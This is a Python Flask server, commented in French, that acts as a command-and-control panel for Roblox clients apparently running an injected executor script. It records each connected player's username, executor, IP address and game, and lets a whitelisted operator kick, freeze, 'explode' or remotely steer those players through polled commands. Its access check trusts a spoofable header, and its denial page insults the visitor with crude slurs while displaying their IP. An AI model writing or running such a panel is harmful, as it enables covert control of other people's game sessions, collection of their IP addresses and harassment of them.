from flask import Flask, request, jsonify, render_template_string, abort
from flask_socketio import SocketIO
import time
import eventlet

eventlet.monkey_patch()

app = Flask(__name__)
app.config["SECRET_KEY"] = "change_me_to_something_long_123456789"
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")

# TES IP AUTORISÉES
ALLOWED_IPS = {"37.66.149.36", "91.170.86.224"}

connected_players = {}
pending_kicks = {}
pending_commands = {}

def check_ip():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()
    if ip not in ALLOWED_IPS:
        abort(403)

@app.errorhandler(403)
def access_denied(e):
    detected = request.headers.get("X-Forwarded-For", request.remote_addr)
    if detected and "," in detected:
        detected = detected.split(",")[0].strip()
    return f"""
    <html><body style="background:#000;color:#ff3366;font-family:Arial;text-align:center;padding-top:15%;">
    <h1>Accès refusé</h1>
    <p style="font-size:2rem;">Ta cru quoi fdp ?</p>
    <p>Ton IP : <b style="font-size:1.8rem;">{detected}</b></p>
    <p>Dégage sale chien</p>
    </body></html>
    """, 403

@app.before_request
def protect_routes():
    if request.path in ["/", "/kick", "/troll", "/control"]:
        check_ip()

# === PANEL HTML + Contrôle clavier réel ===
HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>ROBLOX CONTROL PANEL</title>
<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&family=Inter:wght@400;600&display=swap" rel="stylesheet">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:Inter,sans-serif;background:radial-gradient(circle at top,#0f2027,#000);color:#fff;min-height:100vh}
.container{max-width:1200px;margin:auto;padding:40px}
h1{font-family:Orbitron;font-size:3.5rem;text-align:center;color:#00ffaa;text-shadow:0 0 30px #00ffaa;margin-bottom:20px}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(380px,1fr));gap:25px}
.card{background:rgba(20,20,20,.9);border-radius:18px;padding:25px;box-shadow:0 0 30px rgba(0,0,0,.7);transition:all .3s}
.card:hover{transform:translateY(-8px)}
.name{font-size:1.8rem;color:#ffcc00}
.info,.game{font-size:0.95rem;color:#aaa;margin:8px 0}
.game{color:#0f0;background:#0008;padding:5px 10px;border-radius:8px;display:inline-block}
button{padding:12px 16px;margin:4px 2px;border:none;border-radius:12px;font-weight:bold;cursor:pointer;transition:.2s}
button:hover{transform:scale(1.05)}
.modal{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.95);display:none;align-items:center;justify-content:center;z-index:999}
.modal.active{display:flex}
.controller{background:#111;padding:40px;border-radius:20px;text-align:center;box-shadow:0 0 50px #00ffaa}
.key{width:80px;height:80px;background:#222;border-radius:15px;display:inline-flex;align-items:center;justify-content:center;font-size:2rem;margin:10px;transition:.1s}
.key:active,.key.pressed{background:#00ffaa;color:#000}
</style>
</head>
<body>

<div class="container">
    <h1>ROBLOX CONTROL PANEL</h1>
    <div class="stats" id="stats">Players online: <b>0</b></div>
    <div class="grid" id="players"></div>
</div>

<!-- Controller Modal -->
<div class="modal" id="controllerModal">
    <div class="controller">
        <h2 style="color:#00ffaa;margin-bottom:20px">Contrôle de <span id="ctrlName">???</span></h2>
        <div style="margin-bottom:20px;color:#ff0">Utilise ton clavier ZQSD + Espace</div>
        <div>
            <div class="key" id="keyZ">Z</div>
        </div>
        <div>
            <div class="key" id="keyQ">Q</div>
            <div class="key" id="keyS">S</div>
            <div class="key" id="keyD">D</div>
        </div>
        <div style="margin-top:20px">
            <div class="key" style="width:200px;height:70px;font-size:1.5rem" id="keySpace">ESPACE</div>
        </div>
        <button style="margin-top:25px;background:#f33;padding:15px 30px;font-size:1.2rem" onclick="closeController()">FERMER</button>
    </div>
</div>

<script>
const socket = io();
let currentTarget = null;

function sendKey(key, down) {
    if (!currentTarget) return;
    fetch("/control", {method:"POST",headers:{"Content-Type":"application/json"},
        body:JSON.stringify({userid:currentTarget, key:key, down:down})
    });
}

document.addEventListener("keydown", e => {
    if (!currentTarget) return;
    const k = e.key.toLowerCase();
    if ("zqsd ".includes(k) || k===" ") {
        e.preventDefault();
        const key = k===" "?"space":k;
        if (!document.getElementById("key"+key.toUpperCase()).classList.contains("pressed")) {
            sendKey(key, true);
            document.getElementById("key"+key.toUpperCase()).classList.add("pressed");
        }
    }
});

document.addEventListener("keyup", e => {
    if (!currentTarget) return;
    const k = e.key.toLowerCase();
    if ("zqsd ".includes(k) || k===" ") {
        const key = k===" "?"space":k;
        sendKey(key, false);
        document.getElementById("key"+key.toUpperCase()).classList.remove("pressed");
    }
});

function openController(id, name) {
    currentTarget = id;
    document.getElementById("ctrlName").textContent = name;
    document.getElementById("controllerModal").classList.add("active");
}

function closeController() {
    // Relâche toutes les touches
    ["z","q","s","d","space"].forEach(k => sendKey(k, false));
    currentTarget = null;
    document.getElementById("controllerModal").classList.remove("active");
}

function sendTroll(id, cmd) {
    fetch("/troll", {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userid:id,cmd:cmd}));
}

function render(data) {
    document.getElementById("stats").innerHTML = `Players online: <b>${data.online}</b> / ${data.total}`;
    const grid = document.getElementById("players");
    const currentIds = new Set(Object.keys(data.players));
    Object.entries(data.players).forEach(([id, p]) => {
        let card = document.getElementById(`card_${id}`) || document.createElement("div");
        card.className = "card"; card.id = `card_${id}`;
        card.innerHTML = `
            <div style="display:flex;justify-content:space-between;align-items:center">
                <div class="name"><a href="https://roblox.com/users/${id}/profile" target="_blank" style="color:#ffcc00">${p.username}</a> (${id})</div>
                <div style="background:${p.online?"#0f0":"#f33"};padding:5px 10px;border-radius:8px;font-size:0.8rem">${p.online?"ON":"OFF"}</div>
            </div>
            <div class="info">Executor: ${p.executor} | IP: ${p.ip}</div>
            <div class="game">Jeu: ${p.game || "Inconnu"} (PlaceId: ${p.placeId || "???"})</div>
            <div style="margin:15px 0 10px;font-weight:bold;color:#00ffaa">TROLLS</div>
            <div style="display:grid;grid-template-columns:repeat(4,1fr);gap:6px">
                <button style="background:#ff3366" onclick="fetch('/kick',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userid:'${id}',reason:'Kicked'})})">KICK</button>
                <button style="background:#ff00ff" onclick="sendTroll('${id}','freeze')">FREEZE</button>
                <button style="background:#00ffff" onclick="sendTroll('${id}','spin')">SPIN</button>
                <button style="background:#88ff88" onclick="sendTroll('${id}','rainbow')">RAINBOW</button>
                <button style="background:#ff5555" onclick="sendTroll('${id}','explode')">EXPLODE</button>
                <button style="background:#5555ff" onclick="sendTroll('${id}','invisible')">INVISIBLE</button>
                <button style="background:#6666ff" onclick="sendTroll('${id}','uninvisible')">UNINVISIBLE</button>
                <button style="background:#00ff00;font-weight:bold" onclick="openController('${id}', '${p.username}')">CONTROLLER</button>
            </div>
            <div style="margin-top:10px;display:grid;grid-template-columns:1fr 1fr 1fr;gap:6px">
                <button style="background:#666" onclick="sendTroll('${id}','unfreeze')">UNFREEZE</button>
                <button style="background:#666" onclick="sendTroll('${id}','unspin')">UNSPIN</button>
                <button style="background:#666" onclick="sendTroll('${id}','unrainbow')">UNRAINBOW</button>
            </div>
        `;
        if (!document.getElementById(`card_${id}`)) grid.appendChild(card);
    });
    document.querySelectorAll('.card').forEach(c => !currentIds.has(c.id.replace('card_','')) && c.remove());
}

socket.on("update", render);
</script>
</body>
</html>"""

@app.route("/")
def index():
    return render_template_string(HTML)

@app.route("/api", methods=["GET", "POST"])
def api():
    now = time.time()
    if request.method == "POST":
        try:
            d = request.get_json(silent=True) or {}
            uid = str(d["userid"])
            if d.get("action") == "register":
                connected_players[uid] = {
                    "username": d.get("username", "Unknown"),
                    "executor": d.get("executor", "Unknown"),
                    "ip": d.get("ip", "Unknown"),
                    "game": d.get("game", "Inconnu"),
                    "placeId": d.get("placeId", "???"),
                    "last": now,
                    "online": True
                }
            elif d.get("action") == "heartbeat" and uid in connected_players:
                connected_players[uid]["last"] = now
        except: pass
        return jsonify({"ok": True})

    if request.method == "GET":
        uid = str(request.args.get("userid", ""))
        if not uid: return jsonify({})
        if uid in pending_kicks:
            reason = pending_kicks.pop(uid, "Kicked")
            return jsonify({"command": "kick", "reason": reason})
        if uid in pending_commands:
            cmd = pending_commands.pop(uid)
            return jsonify({"command": cmd})
        return jsonify({})

@app.route("/kick", methods=["POST"])
def kick():
    check_ip()
    data = request.get_json() or {}
    uid = str(data.get("userid", ""))
    pending_kicks[uid] = data.get("reason", "Kicked")
    return jsonify({"sent": True})

@app.route("/troll", methods=["POST"])
def troll():
    check_ip()
    data = request.get_json() or {}
    uid = str(data.get("userid", ""))
    cmd = data.get("cmd", "")
    if uid and cmd:
        pending_commands[uid] = cmd
    return jsonify({"sent": True})

@app.route("/control", methods=["POST"])
def control():
    check_ip()
    data = request.get_json() or {}
    uid = str(data.get("userid", ""))
    key = data.get("key", "").lower()
    down = data.get("down", False)
    if uid and key in ["z","q","s","d","space"]:
        pending_commands[uid] = f"control_{key}_{'down' if down else 'up'}"
    return jsonify({"ok": True})

def broadcast_loop():
    while True:
        now = time.time()
        online = 0
        to_remove = []
        for uid, p in connected_players.items():
            if now - p["last"] > 30:
                to_remove.append(uid)
            else:
                p["online"] = now - p["last"] < 15
                if p["online"]: online += 1
        for uid in to_remove:
            connected_players.pop(uid, None)
        socketio.emit("update", {"players": connected_players, "online": online, "total": len(connected_players)})
        socketio.sleep(2)

if __name__ == "__main__":
    socketio.start_background_task(broadcast_loop)
    socketio.run(app, host="0.0.0.0", port=5000)
